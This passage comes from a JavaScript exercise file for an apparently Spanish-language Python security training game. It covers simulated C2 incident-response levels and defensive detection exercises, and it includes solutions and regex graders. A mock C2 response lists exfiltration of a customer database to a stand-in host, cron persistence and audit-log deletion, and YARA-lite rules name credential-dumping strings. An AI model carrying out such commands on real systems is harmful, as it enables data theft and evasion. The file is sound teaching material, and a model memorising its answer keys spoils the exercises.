      { type: 'mustContain', regex: /CALDERA-HANDSHAKE-V2/, message: "El handshake debe ser exacto" },
    ],
    targets: {
      "backup.northbank.local": {
        ports: {
          4444: {
            status: "open",
            service: "Caldera C2",
            socket_handler: (payload) => {
              // Token esperado: md5("2026-04-27") = 6a4d3...
              // Calculamos en JS para hacer la comparación coherente
              const dailyHash = (() => {
                // Simple md5 implementation isn't trivial in pure JS; use sync via crypto.subtle is async.
                // Para simplificar: hardcodeo el md5 esperado.
                return "0d8efea16f9d1ce0d62b88dde2f5c2c3";
              })();
              const expected = `CALDERA-HANDSHAKE-V2:${dailyHash}`;
              if (payload === expected) {
                return [
                  "OPERATION_ID: caldera-northbank-2026-04",
                  "TARGET: db.northbank.local",
                  "PENDING_COMMANDS:",
                  "  1. exfil:/var/lib/mysql/customers.dump -> https://drop.caldera.test/01",
                  "  2. persist:cron @reboot /tmp/.x/agent",
                  "  3. cleanup:/var/log/audit/audit.log",
                  "STATUS: awaiting next pull",
                ].join("\n");
              }
              return "ERR_HANDSHAKE_INVALID";
            },
          },
        },
      },
    },
  },

  {
    id: 49, chapter: 8,
    title: "Caldera — corte y reporte",
    location: "Operación real · respuesta a incidente",
    concept: "Encadenar todo + reporte para SOC",
    intro:
      "\"Tienes la información. Ahora hay que estructurarla para el equipo blue team " +
      "para que actúen: bloqueo de IPs, parcheado, rotación de credenciales. Construye " +
      "un reporte claro y completo. Esto se enviará al CISO de NorthBank.\"",
    outro:
      "Reporte entregado. Bloqueo del C2 en marcha.",
    diary:
      "Día 49. Los datos importan. Pero un reporte mal estructurado es como no haber " +
      "encontrado nada. JSON, secciones claras, severidad por hallazgo. Esto se le " +
      "manda al CISO.",
    mission:
      "Construye un dict report con la siguiente estructura, y vuelca como JSON " +
      "(indent=2):\n\n" +
      "  {\n" +
      "    \"client\": \"NorthBank\",\n" +
      "    \"date\": \"2026-04-27\",\n" +
      "    \"summary\": \"Caldera APT confirmed on backup.northbank.local\",\n" +
      "    \"findings\": [\n" +
      "      { \"id\": 1, \"severity\": \"critical\", \"host\": \"backup.northbank.local\", \"port\": 4444, \"description\": \"Caldera C2 active\" },\n" +
      "      { \"id\": 2, \"severity\": \"critical\", \"host\": \"backup.northbank.local\", \"port\": 9001, \"description\": \"C2 fallback channel\" },\n" +
      "      { \"id\": 3, \"severity\": \"high\", \"host\": \"db.northbank.local\", \"description\": \"Targeted by C2 — DB exfil queued\" }\n" +
      "    ],\n" +
      "    \"recommended_actions\": [...] (al menos 3 strings)\n" +
      "  }\n\n" +
      "Después del JSON, imprime un resumen de una línea: \"X hallazgos críticos, Y high.\"",
    hint:
      'import json\nfrom collections import Counter\n\nfindings = [\n    {"id": 1, "severity": "critical", "host": "backup.northbank.local", "port": 4444, "description": "Caldera C2 active"},\n    {"id": 2, "severity": "critical", "host": "backup.northbank.local", "port": 9001, "description": "C2 fallback channel"},\n    {"id": 3, "severity": "high", "host": "db.northbank.local", "description": "Targeted by C2 — DB exfil queued"},\n]\n\nreport = {\n    "client": "NorthBank",\n    "date": "2026-04-27",\n    "summary": "Caldera APT confirmed on backup.northbank.local",\n    "findings": findings,\n    "recommended_actions": [\n        "Aislar backup.northbank.local de la red corporativa",\n        "Bloquear IPs de C2 conocidas en perímetro",\n        "Rotar credenciales DB y revisar logs de mysql desde fecha sospechosa",\n        "Forensics: imagen del disco antes de cualquier limpieza",\n    ],\n}\n\nprint(json.dumps(report, indent=2))\nsev = Counter(f["severity"] for f in findings)\nprint(f"{sev[\'critical\']} hallazgos críticos, {sev[\'high\']} high.")',
    strategy:
      "PASO 1 — Imports: json, Counter.\n" +
      "\n" +
      "PASO 2 — Construye la lista findings. Cada finding es un dict con\n" +
      "         las claves: id, severity, host, port (opcional según el\n" +
      "         hallazgo), description.\n" +
      "         Mínimo: 2 critical (4444 C2 + 9001 fallback) y 1 high\n" +
      "         (db targeted).\n" +
      "\n" +
      "PASO 3 — Construye el dict report con la estructura completa:\n" +
      "         - client: nombre del cliente.\n" +
      "         - date: fecha del incidente.\n" +
      "         - summary: una línea resumen.\n" +
      "         - findings: la lista anterior.\n" +
      "         - recommended_actions: lista de strings con al menos 3\n" +
      "           acciones concretas (aislar, bloquear, rotar, forensics).\n" +
      "\n" +
      "PASO 4 — Vuelca con json.dumps(report, indent=2). Es el formato\n" +
      "         que se mete en el ticket del CISO.\n" +
      "\n" +
      "PASO 5 — Counter para el resumen: cuenta findings por severity.\n" +
      "         Imprime la línea final \"X hallazgos críticos, Y high\".\n" +
      "\n" +
      "RECORDATORIO — Reporte para BLUE TEAM = acciones concretas, no\n" +
      "         hallazgos sueltos. Cada \"recommended_action\" tiene que ser\n" +
      "         algo que el equipo del cliente pueda ejecutar mañana.",
    skeleton:
      'import json\n' +
      'from collections import Counter\n' +
      '\n' +
      'findings = [\n' +
      '    {"id": 1, "severity": "critical", "host": "backup.northbank.local",\n' +
      '     "port": 4444, "description": "Caldera C2 active"},\n' +
      '    {"id": 2, "severity": [TODO: nivel crítico — string], "host": "backup.northbank.local",\n' +
      '     "port": 9001, "description": "C2 fallback channel"},\n' +
      '    {"id": 3, "severity": "high", "host": "db.northbank.local",\n' +
      '     "description": "Targeted by C2 — DB exfil queued"},\n' +
      ']\n' +
      '\n' +
      'report = {\n' +
      '    "client": "NorthBank",\n' +
      '    "date": "2026-04-27",\n' +
      '    "summary": "Caldera APT confirmed on backup.northbank.local",\n' +
      '    "findings": findings,\n' +
      '    "recommended_actions": [\n' +
      '        "Aislar backup.northbank.local de la red corporativa",\n' +
      '        "Bloquear IPs de C2 conocidas en perímetro",\n' +
      '        [TODO: añade al menos 1 acción más],\n' +
      '    ],\n' +
      '}\n' +
      '\n' +
      'print(json.dumps(report, [TODO: indent=2 para multilínea]))\n' +
      '\n' +
      'sev = Counter(f["severity"] for f in findings)\n' +
      'print(f"{sev[\'critical\']} hallazgos críticos, {sev[\'high\']} high.")',
    starterCode:
      '# Reporte para el blue team. Misión y estructura en el briefing.\n\nimport json\n',
    win: { mustPrint: true },
    requires: [
      { type: 'mustContain', regex: /\bjson\.dumps\s*\(/, message: "Vuelca el reporte como JSON" },
      { type: 'mustContain', regex: /critical/i, message: "Marca al menos un hallazgo como critical" },
      { type: 'mustContain', regex: /\bindent\s*=\s*2/, message: "Usa indent=2 para legibilidad" },
    ],
  },

  {
    id: 50, chapter: 8,
    title: "EVALUACIÓN FINAL — Caldera contenido",
    location: "Sala de evaluaciones · sesión final",
    concept: "EXAMEN FINAL — pipeline de respuesta a incidente",
    is_exam: true,
    is_final: true,
    intro:
      "\"Última prueba. Pipeline completo de respuesta a incidente: recon de la " +
      "infraestructura del cliente, identificación del host con servicios C2 " +
      "anómalos, replay del handshake en la sandbox para extraer la cola de " +
      "comandos del atacante, y reporte final. Sin pista. Demuestra todo lo " +
      "que has aprendido.\"",
    outro:
      "Caldera neutralizado. Auditoría firmada. Listo para campo.",
    diary:
      "Día 50. La última. Iris cierra la puerta. Yo no necesito pista. Después de " +
      "esto, el siguiente paso ya está fuera de PyHack — lab real, OSCP, certificación. " +
      "Pero esto cierra el principio.",
    mission:
      "Operativo completo:\n\n" +
      "1) Define una función find_anomalous_host(hosts, c2_ports) que, escaneando, " +
      "devuelva el primer host con un puerto en c2_ports abierto.\n" +
      "2) Define una función pull_c2_data(host, port) que envíe el handshake correcto " +
      "(\"CALDERA-HANDSHAKE-V2:\" + md5_hex(\"2026-04-27\")) y devuelva la respuesta.\n" +
      "3) Define build_report(host, c2_response) que devuelva un dict con: " +
      "host_compromised, c2_data (los strings), severity (\"critical\"), date.\n" +
      "4) Llámalas en orden contra hosts " +
      "[\"web.northbank.local\", \"db.northbank.local\", \"backup.northbank.local\"] " +
      "con c2_ports [4444, 9001].\n" +
      "5) Imprime el reporte como JSON con indent=2.\n\n" +
      "RESTRICCIONES:\n" +
      "• Máximo 28 líneas\n" +
      "• Debes definir AL MENOS 3 funciones con def\n" +
      "• Debes usar import hashlib, import json\n" +
      "• Debes usar scan_port y socket_request\n" +
      "• El reporte debe contener la clave \"severity\" con valor \"critical\"",
    hint: "EXAMEN FINAL — sin pista.",
    solution:
      'import hashlib, json\n\ndef find_anomalous_host(hosts, c2_ports):\n    for h in hosts:\n        for p in c2_ports:\n            if scan_port(h, p) == "open":\n                return h, p\n    return None, None\n\ndef pull_c2_data(host, port):\n    token = hashlib.md5("2026-04-27".encode()).hexdigest()\n    return socket_request(host, port, f"CALDERA-HANDSHAKE-V2:{token}")\n\ndef build_report(host, response):\n    return {\n        "host_compromised": host,\n        "c2_data": response.split("\\n") if response else [],\n        "severity": "critical",\n        "date": "2026-04-27",\n    }\n\nhost, port = find_anomalous_host(\n    ["web.northbank.local", "db.northbank.local", "backup.northbank.local"],\n    [4444, 9001])\nresp = pull_c2_data(host, port)\nprint(json.dumps(build_report(host, resp), indent=2))',
    starterCode:
      '# EXAMEN FINAL — Operación Caldera\n# Recon -> handshake C2 -> reporte JSON\n# 3 funciones mínimo. Sin pista.\n\n',
    win: { mustPrint: true },
    restrictions: [
      { type: 'maxLines', value: 28, message: "Máximo 28 líneas" },
      { type: 'maxOccurrences', regex: /\bdef\s+\w+/g, max: 99, message: "Funciones" },
      { type: 'mustContain', regex: /\bdef\s+\w+[\s\S]*\bdef\s+\w+[\s\S]*\bdef\s+\w+/, message: "Define al menos 3 funciones con def" },
      { type: 'mustContain', regex: /\bimport\s+hashlib\b|,\s*hashlib\b/, message: "Importa hashlib" },
      { type: 'mustContain', regex: /\bimport\s+json\b|,\s*json\b/, message: "Importa json" },
      { type: 'mustContain', regex: /\bscan_port\s*\(/, message: "Usa scan_port" },
      { type: 'mustContain', regex: /\bsocket_request\s*\(/, message: "Usa socket_request" },
      { type: 'mustContain', regex: /["']critical["']/, message: 'El reporte debe marcar severity "critical"' },
    ],
    targets: {
      "web.northbank.local":    { ports: { 22: { status: "open" }, 80: { status: "open" }, 443: { status: "open" } } },
      "db.northbank.local":     { ports: { 22: { status: "open" }, 3306: { status: "open" } } },
      "backup.northbank.local": {
        ports: {
          4444: {
            status: "open", service: "Caldera C2",
            socket_handler: (payload) => {
              const expected = "CALDERA-HANDSHAKE-V2:0d8efea16f9d1ce0d62b88dde2f5c2c3";
              if (payload === expected) {
                return [
                  "OPERATION_ID: caldera-northbank-2026-04",
                  "TARGET: db.northbank.local",
                  "PENDING_COMMANDS:",
                  "  1. exfil:/var/lib/mysql/customers.dump -> https://drop.caldera.test/01",
                  "  2. persist:cron @reboot /tmp/.x/agent",
                  "  3. cleanup:/var/log/audit/audit.log",
                  "STATUS: awaiting next pull",
                ].join("\n");
              }
              return "ERR_HANDSHAKE_INVALID";
            },
          },
        },
      },
    },
  },

  // ============================================================
  // CAPÍTULO 9 — DETECCIÓN Y ANÁLISIS DEFENSIVO (51-...)
  // Lado del analista de threat intel: clasificación de muestras
  // por strings (YARA-like), detección de typosquat, extracción de
  // IOCs, auditoría de dependencias, reglas Sigma-like.
  // Todos los datos son sintéticos. El alumno solo procesa, no
  // genera código ofensivo.
  // ============================================================

  {
    id: 51, chapter: 9,
    title: "YARA-lite: clasificar muestras por strings",
    location: "SOC · pila de muestras pendiente de triage",
    concept: "Matching multi-regla: dict de reglas → clasificación",
    is_checkpoint: true,
    intro:
      "\"El sandbox del SOC ha extraído los strings de varias muestras sospechosas " +
      "(básicamente el equivalente educativo de `strings sample.bin`). Tu trabajo " +
      "no es analizar el binario en bruto: es escribir un matcher tipo YARA-lite " +
      "que clasifique cada muestra según qué indicadores aparecen. Cada regla es " +
      "una lista de strings característicos de una familia. Si todos los strings " +
      "de una regla aparecen en la muestra, la regla matchea.\"",
    outro:
      "Triage automatizado: cada muestra clasificada por las reglas que matchean. " +
      "Esto es exactamente el patrón que usan YARA y los motores AV.",
    diary:
      "Día 51. Match por intersección de sets. Ni regex complicada ni IA — un " +
      "dict de reglas, un set de strings, un `issubset` por muestra. Aún así, " +
      "es la base de cualquier motor de detección estática.",
    mission:
      "Datos: tienes una lista SAMPLES (cada item: id + lista de strings ya extraídos) " +
      "y un dict RULES (familia → lista de strings característicos).\n\n" +
      "Para cada muestra:\n" +
      "1) Comprueba qué reglas matchean (TODOS los strings de la regla deben aparecer).\n" +
      "2) Imprime: \"<sample_id>: [familia1, familia2, ...]\" o \"<sample_id>: clean\".\n" +
      "3) Al final imprime un resumen: \"N/M muestras con match — X reglas distintas activadas\".\n\n" +
      "Pista mental: convierte la lista de strings de cada muestra a un set, y comprueba " +
      "set(rule_strings).issubset(sample_strings).",
    hint:
      'matched_total = 0\nrules_hit = set()\nfor s in SAMPLES:\n    estr = set(s["strings"])\n    matches = [name for name, indicators in RULES.items() if set(indicators).issubset(estr)]\n    if matches:\n        matched_total += 1\n        rules_hit.update(matches)\n        print(f"{s[\'id\']}: {matches}")\n    else:\n        print(f"{s[\'id\']}: clean")\nprint(f"{matched_total}/{len(SAMPLES)} muestras con match — {len(rules_hit)} reglas distintas activadas")',
    strategy:
      "PASO 1 — Inicializa contadores: matched_total = 0 (cuántas muestras\n" +
      "         tienen al menos un match) y rules_hit = set() (qué reglas\n" +
      "         distintas se han activado en total).\n" +
      "\n" +
      "PASO 2 — Para cada muestra de SAMPLES:\n" +
      "         a) Convierte sample['strings'] (una lista) a un SET. Esto\n" +
      "            permite usar issubset y comprobaciones O(1).\n" +
      "         b) Para cada regla del dict RULES, comprueba si TODOS los\n" +
      "            strings indicadores están en el set de la muestra.\n" +
      "            Operador: set(indicadores).issubset(strings_muestra).\n" +
      "         c) Acumula los nombres de las reglas que matchean en una\n" +
      "            lista local 'matches'.\n" +
      "\n" +
      "PASO 3 — Si la lista 'matches' está vacía → la muestra es clean.\n" +
      "         Si no → incrementa matched_total y añade los nombres a\n" +
      "         rules_hit (set.update acepta una lista).\n" +
      "\n" +
      "PASO 4 — Imprime el resultado por muestra:\n" +
      "         - 'sample_a: [\"downloader_generic\"]' si matchea\n" +
      "         - 'sample_d: clean' si no\n" +
      "\n" +
      "PASO 5 — Al final, imprime resumen:\n" +
      "         '4/5 muestras con match — 3 reglas distintas activadas'.",
    skeleton:
      'matched_total = 0\n' +
      'rules_hit = set()\n' +
      '\n' +
      'for s in SAMPLES:\n' +
      '    # Convierte la lista de strings de la muestra a SET\n' +
      '    estr = [TODO: set(...) sobre s["strings"]]\n' +
      '\n' +
      '    # Para cada regla, ¿están TODOS sus indicadores en estr?\n' +
      '    matches = [\n' +
      '        name\n' +
      '        for name, indicators in RULES.items()\n' +
      '        if [TODO: set(indicators).issubset(estr)]\n' +
      '    ]\n' +
      '\n' +
      '    if matches:\n' +
      '        matched_total += 1\n' +
      '        rules_hit.[TODO: añadir todos los matches al set] (matches)\n' +
      '        print(f"{s[\'id\']}: {matches}")\n' +
      '    else:\n' +
      '        print(f"{s[\'id\']}: clean")\n' +
      '\n' +
      '# Resumen final\n' +
      'print(f"{matched_total}/{[TODO: total de muestras]} muestras con match — "\n' +
      '      f"{[TODO: cuántas reglas distintas activadas]} reglas distintas activadas")',
    starterCode:
      '# Reglas YARA-lite: cada regla = familia → lista de strings indicador.\nRULES = {\n    "downloader_generic": ["URLDownloadToFile", "WinExec", "tmp"],\n    "keylogger_generic": ["GetAsyncKeyState", "SetWindowsHookEx"],\n    "credential_dumper": ["lsass", "OpenProcess", "MiniDumpWriteDump"],\n    "persistence_run_key": ["HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"],\n}\n\n# Strings ya extraídos por la sandbox (equivalente educativo de `strings`).\nSAMPLES = [\n    {"id": "sample_a", "strings": ["URLDownloadToFile", "WinExec", "tmp", "kernel32.dll"]},\n    {"id": "sample_b", "strings": ["GetAsyncKeyState", "SetWindowsHookEx", "user32.dll"]},\n    {"id": "sample_c", "strings": ["lsass", "OpenProcess", "MiniDumpWriteDump", "advapi32.dll"]},\n    {"id": "sample_d", "strings": ["printf", "scanf", "main"]},\n    {"id": "sample_e", "strings": ["URLDownloadToFile", "WinExec", "tmp", "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"]},\n]\n\n',
    win: { mustPrint: true, mustPrintMin: 6 },
    requires: [
      { type: 'mustContain', regex: /\bset\s*\(/, message: "Convierte a set para comparar (issubset)" },
      { type: 'mustContain', regex: /\bissubset\s*\(/, message: "Usa set.issubset para que matcheen TODOS los indicadores" },
      { type: 'mustContain', regex: /\bfor\s+\w+\s+in\s+SAMPLES\b/, message: "Itera sobre SAMPLES" },
    ],
  },

  {
    id: 52, chapter: 9,
    title: "Typosquat de paquetes en requirements.txt",
    location: "Auditoría de cadena de suministro · proyecto cliente",
    concept: "Distancia de Levenshtein + lista de paquetes legítimos",
    intro:
      "\"Auditoría defensiva del requirements.txt de un cliente. Los atacantes " +
      "publican paquetes con nombres muy parecidos a los populares ('reqeusts', " +
      "'urllib4', 'py-cryptos') esperando que alguien los instale por error. Tu " +
      "trabajo: dado un requirements.txt y una whitelist de paquetes legítimos " +
      "populares, detectar candidatos a typosquat. Distancia 0 = OK, distancia " +
      "pequeña pero >0 = sospecha.\"",
    outro:
      "Lista de typosquat candidatos lista para reportar al equipo de la cliente.",
    diary:
      "Día 52. Levenshtein clásico. La función ya implementada en docs y en el módulo " +
      "`difflib` de stdlib (SequenceMatcher), pero hoy la escribo a mano con tabla DP " +
      "porque conviene saber cómo funciona. La heurística: distancia entre 1 y 2 contra " +
      "un nombre popular = probable typosquat.",
    mission:
      "Datos: REQUIREMENTS (lista de paquetes que el proyecto importa) y POPULAR (lista " +
      "blanca de paquetes legítimos conocidos).\n\n" +
      "1) Para cada paquete en REQUIREMENTS:\n" +
      "   • Si está en POPULAR → \"<pkg>: OK\".\n" +
      "   • Si no, calcula distancia Levenshtein contra cada uno de POPULAR. Si la mínima " +
      "es 1 o 2 → \"<pkg>: TYPOSQUAT? parecido a '<popular>' (distancia=N)\".\n" +
      "   • Si la mínima es ≥3 → \"<pkg>: desconocido (no parece typosquat)\".\n" +
      "2) Al final imprime: \"N candidatos a typosquat detectados\".",
    hint:
      'def lev(a, b):\n    if a == b: return 0\n    if not a: return len(b)\n    if not b: return len(a)\n    prev = list(range(len(b) + 1))\n    for i, ca in enumerate(a, 1):\n        cur = [i]\n        for j, cb in enumerate(b, 1):\n            cost = 0 if ca == cb else 1\n            cur.append(min(cur[-1] + 1, prev[j] + 1, prev[j-1] + cost))\n        prev = cur\n    return prev[-1]\n\ntypos = 0\nfor pkg in REQUIREMENTS:\n    if pkg in POPULAR:\n        print(f"{pkg}: OK")\n        continue\n    best = min((lev(pkg, p), p) for p in POPULAR)\n    d, similar = best\n    if 1 <= d <= 2:\n        typos += 1\n        print(f"{pkg}: TYPOSQUAT? parecido a \'{similar}\' (distancia={d})")\n    else:\n        print(f"{pkg}: desconocido (no parece typosquat)")\nprint(f"{typos} candidatos a typosquat detectados")',
    strategy:
      "PASO 1 — Implementa la función lev(a, b) que devuelve la distancia\n" +
      "         de Levenshtein entre dos strings. Lee la teoría: tabla DP,\n" +
      "         recurrencia (mín de 3 opciones).\n" +
      "         Atajos: si a==b → 0, si uno está vacío → longitud del otro.\n" +
      "\n" +
      "PASO 2 — Inicializa contador typos = 0.\n" +
      "\n" +
      "PASO 3 — Para cada pkg en REQUIREMENTS:\n" +
      "         a) Si pkg ya está en POPULAR → es legítimo: imprime\n" +
      "            'pkg: OK' y continúa con el siguiente.\n" +
      "         b) Si no, calcula la distancia mínima contra cada paquete\n" +
      "            de POPULAR. Truco idiomático: min((lev(pkg, p), p)\n" +
      "            for p in POPULAR) — devuelve la tupla (distancia,\n" +
      "            paquete_más_parecido).\n" +
      "         c) Desempaqueta: d, similar = best.\n" +
      "         d) Si 1 <= d <= 2 → typosquat probable. Incrementa typos\n" +
      "            e imprime el aviso con el nombre del paquete legítimo.\n" +
      "         e) Si d >= 3 → desconocido pero no confundible. Imprime.\n" +
      "\n" +
      "PASO 4 — Imprime el contador final.",
    skeleton:
      'def lev(a, b):\n' +
      '    # Casos base\n' +
      '    if a == b: return 0\n' +
      '    if not a: return [TODO: longitud de b]\n' +
      '    if not b: return [TODO: longitud de a]\n' +
      '    # Tabla DP — solo guardamos la fila previa\n' +
      '    prev = list(range(len(b) + 1))\n' +
      '    for i, ca in enumerate(a, 1):\n' +
      '        cur = [i]\n' +
      '        for j, cb in enumerate(b, 1):\n' +
      '            cost = 0 if ca == cb else 1\n' +
      '            cur.append(min(\n' +
      '                cur[-1] + 1,        # borrado\n' +
      '                prev[j] + 1,        # inserción\n' +
      '                prev[j-1] + cost,   # sustitución\n' +
      '            ))\n' +
      '        prev = cur\n' +
      '    return prev[-1]\n' +
      '\n' +
      'typos = 0\n' +
      'for pkg in REQUIREMENTS:\n' +
      '    if pkg in POPULAR:\n' +
      '        print(f"{pkg}: OK")\n' +
      '        continue\n' +
      '    # min con tupla (distancia, paquete) → devuelve la mínima distancia\n' +
      '    best = min((lev(pkg, p), p) for p in [TODO: la whitelist])\n' +
      '    d, similar = best\n' +
      '    if [TODO: condición distancia entre 1 y 2]:\n' +
      '        typos += 1\n' +
      '        print(f"{pkg}: TYPOSQUAT? parecido a \'{similar}\' (distancia={d})")\n' +
      '    else:\n' +
      '        print(f"{pkg}: desconocido (no parece typosquat)")\n' +
      '\n' +
      'print(f"{typos} candidatos a typosquat detectados")',
    starterCode:
      '# Whitelist de paquetes populares (auditoría supply-chain).\nPOPULAR = [\n    "requests", "numpy", "pandas", "urllib3", "pycryptodome",\n    "flask", "django", "pytest", "sqlalchemy", "pillow",\n]\n\n# Lo que aparece en el requirements.txt del cliente.\nREQUIREMENTS = [\n    "requests",\n    "numpy",\n    "reqeusts",\n    "urllib4",\n    "flask",\n    "djano",\n    "matplotlib",\n    "py-cryptos",\n]\n\n',
    win: { mustPrint: true, mustPrintMin: 8 },
    requires: [
      { type: 'mustContain', regex: /\bdef\s+lev\b|\bdef\s+\w*levenshtein\w*\b|\bdistance\b/, message: "Define una función de distancia (Levenshtein o equivalente)" },
      { type: 'mustContain', regex: /\bfor\s+\w+\s+in\s+REQUIREMENTS\b/, message: "Itera sobre REQUIREMENTS" },
      { type: 'mustContain', regex: /\bmin\s*\(/, message: "Usa min(...) para encontrar la distancia mínima" },
    ],
  },

  {
    id: 53, chapter: 9,
    title: "Extracción de IOCs en emails sospechosos",
    location: "SOC · cola de phishing reportado por usuarios",
    concept: "Regex sobre texto + whitelist de dominios corporativos",
    intro:
      "\"Los usuarios de la empresa cliente reportan al SOC emails que les parecen " +
      "phishing. Tu trabajo: extraer los IOCs (URLs, dominios, IPs) y clasificarlos " +
      "contra la whitelist de dominios legítimos. Lo que mandes al threat intel feed " +
      "tiene que ser SOLO lo que NO esté en la whitelist — los dominios propios de la " +
      "empresa NO se publican como malicious. Patrón clásico de analista L1.\"",
    outro:
      "IOCs sospechosos extraídos. Próximo paso: enriquecerlos contra VirusTotal / " +
      "AbuseIPDB y meterlos en la blacklist del SEG.",
    diary:
      "Día 53. re.findall + parsing de URL. La parte sutil es no marcar tus propios " +
      "dominios como malicious por accidente — un falso positivo en la blacklist " +
      "corporativa puede dejar a media empresa sin email legítimo.",
    mission:
      "Datos: lista EMAILS (cada item: id, from, subject, body) y set TRUSTED_DOMAINS " +
      "(dominios propios del cliente).\n\n" +
      "Para cada email:\n" +
      "1) Extrae todas las URLs del body con regex (https?://...).\n" +
      "2) De cada URL saca el dominio (parte entre // y la primera / o :).\n" +
      "3) Extrae también IPs IPv4 con regex.\n" +
      "4) Filtra los dominios que NO estén en TRUSTED_DOMAINS.\n" +
      "5) Imprime: \"<id> (<subject>): SOSPECHOSO — domains=[...] ips=[...]\" o \"<id>: OK\".\n\n" +
      "Al final, imprime: \"N/M emails con IOCs para feed de threat intel\".",
    hint:
      'import re\n\nURL_RE = re.compile(r"https?://[^\\s]+")\nIP_RE = re.compile(r"\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b")\nDOMAIN_RE = re.compile(r"https?://([^/\\s:]+)")\n\nflagged = 0\nfor em in EMAILS:\n    body = em["body"]\n    domains = [m for m in DOMAIN_RE.findall(body) if m not in TRUSTED_DOMAINS]\n    ips = IP_RE.findall(body)\n    if domains or ips:\n        flagged += 1\n        print(f"{em[\'id\']} ({em[\'subject\']!r}): SOSPECHOSO — domains={domains} ips={ips}")\n    else:\n        print(f"{em[\'id\']}: OK")\nprint(f"{flagged}/{len(EMAILS)} emails con IOCs para feed de threat intel")',
    strategy:
      "PASO 1 — Importa re y pre-compila 3 regex (más eficiente que recompilar\n" +
      "         en cada iteración):\n" +
      "         - URL_RE: 'https?://[^\\s]+' → captura URL completa\n" +
      "         - IP_RE: '\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b' → IP IPv4\n" +
      "         - DOMAIN_RE: 'https?://([^/\\s:]+)' → solo el dominio\n" +
      "         (con grupo capturado entre paréntesis).\n" +
      "\n" +
      "PASO 2 — Inicializa contador flagged = 0.\n" +
      "\n" +
      "PASO 3 — Para cada email del array EMAILS:\n" +
      "         a) Extrae todos los dominios del body con DOMAIN_RE.findall.\n" +
      "         b) FILTRA: descarta los que estén en TRUSTED_DOMAINS\n" +
      "            (corporativos del cliente).\n" +
      "         c) Extrae todas las IPs con IP_RE.findall.\n" +
      "\n" +
      "PASO 4 — Si quedan dominios sospechosos O hay IPs:\n" +
      "         - Es candidato a phishing → incrementa flagged.\n" +
      "         - Imprime '<id> (<subject>): SOSPECHOSO — domains=... ips=...'.\n" +
      "         Si no hay nada → imprime '<id>: OK'.\n" +
      "\n" +
      "PASO 5 — Al final imprime '<flagged>/<total> emails con IOCs...'.",
    skeleton:
      'import re\n' +
      '\n' +
      '# Regex pre-compiladas (más eficiente)\n' +
      'URL_RE = re.compile(r"https?://[^\\s]+")\n' +
      'IP_RE = re.compile(r"\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b")\n' +
      'DOMAIN_RE = re.compile(r"https?://([^/\\s:]+)")  # () = grupo capturable\n' +
      '\n' +
      'flagged = 0\n' +
      'for em in EMAILS:\n' +
      '    body = em["body"]\n' +
      '\n' +
      '    # Dominios extraídos, filtrando los confiables\n' +
      '    domains = [\n' +
      '        m for m in [TODO: DOMAIN_RE.findall sobre body]\n' +
      '        if m not in [TODO: la whitelist corporativa]\n' +
      '    ]\n' +
      '    ips = [TODO: IP_RE.findall sobre body]\n' +
      '\n' +
      '    if domains or ips:\n' +
      '        flagged += 1\n' +
      '        print(f"{em[\'id\']} ({em[\'subject\']!r}): SOSPECHOSO — "\n' +
      '              f"domains={domains} ips={ips}")\n' +
      '    else:\n' +
      '        print(f"{em[\'id\']}: OK")\n' +
      '\n' +
      'print(f"{flagged}/{len(EMAILS)} emails con IOCs para feed de threat intel")',
    starterCode:
      '# Dominios propios del cliente (whitelist corporativa).\nTRUSTED_DOMAINS = {"acmecorp.com", "acmecorp.local", "intranet.acmecorp.com"}\n\n# Cola de emails reportados como sospechosos por los usuarios.\nEMAILS = [\n    {\n        "id": "msg_001",\n        "from": "billing@acm3-corp.support",\n        "subject": "Invoice OVERDUE — pay now",\n        "body": "Click https://acm3-corp.support/inv/1234 to pay. From IP 185.220.101.45.",\n    },\n    {\n        "id": "msg_002",\n        "from": "security@acmecorp.com",\n        "subject": "Quarterly password reset reminder",\n        "body": "Visit https://intranet.acmecorp.com/reset to update your password.",\n    },\n    {\n        "id": "msg_003",\n        "from": "no-reply@payr0ll.io",\n        "subject": "Salary update Q2",\n        "body": "Confirm at http://payr0ll.io/login and verify https://payr0ll.io.evil-cdn.net/auth from 203.0.113.99",\n    },\n    {\n        "id": "msg_004",\n        "from": "ceo@acmecorp.com",\n        "subject": "Reunión jueves",\n        "body": "Os recuerdo la reunión, agenda en https://intranet.acmecorp.com/agenda.",\n    },\n]\n\n',
    win: { mustPrint: true, mustPrintMin: 4 },
    requires: [
      { type: 'mustContain', regex: /\bimport\s+re\b/, message: "Importa re" },
      { type: 'mustContain', regex: /re\.\w+\s*\(/, message: "Usa re.compile / re.findall / re.search" },
      { type: 'mustContain', regex: /\bTRUSTED_DOMAINS\b/, message: "Filtra contra TRUSTED_DOMAINS" },
      { type: 'mustContain', regex: /\bfor\s+\w+\s+in\s+EMAILS\b/, message: "Itera sobre EMAILS" },
    ],
  },

  {
    id: 54, chapter: 9,
    title: "Auditoría de dependencias contra feed de CVEs",
    location: "Auditoría DevSecOps · pipeline CI del cliente",
    concept: "Parsing de requirements + comparación de versiones + lookup en feed",
    intro:
      "\"El cliente quiere meter en su CI un check que falle el build si las " +
      "dependencias declaradas tienen CVEs conocidos. Tu trabajo: leer el " +
      "requirements.txt (formato 'paquete==versión'), cruzar contra un dict " +
      "CVE_DB simulado y generar un reporte JSON con los hallazgos por severidad. " +
      "Equivalente educativo de pip-audit / safety / Trivy.\"",
    outro:
      "Reporte de vulnerabilidades listo para el pipeline. Cualquier 'critical' o " +
      "'high' debería bloquear el deploy.",
    diary:
      "Día 54. Versiones como tuplas de enteros (2.0.1 → (2,0,1)) — comparación " +
      "lexicográfica natural. Funciona para semver simple. Para semver real con " +
      "pre-releases, usar packaging.version. Hoy con tuplas basta.",
    mission:
      "Datos: REQUIREMENTS_TXT (string multi-línea, una dep por línea, formato " +
      "'paquete==X.Y.Z') y CVE_DB (dict {paquete: [{rule, cve, severity}]}).\n\n" +
      "1) Parsea cada línea de REQUIREMENTS_TXT en (pkg, version).\n" +
      "2) Implementa is_vulnerable(version, rule) — rule es '<X.Y.Z' o '<=X.Y.Z'.\n" +
      "3) Para cada dep, comprueba todas sus reglas en CVE_DB. Acumula hallazgos.\n" +
      "4) Imprime el reporte como JSON con indent=2.\n" +
      "5) Imprime también: \"critical=X high=Y medium=Z low=W\".",
    hint:
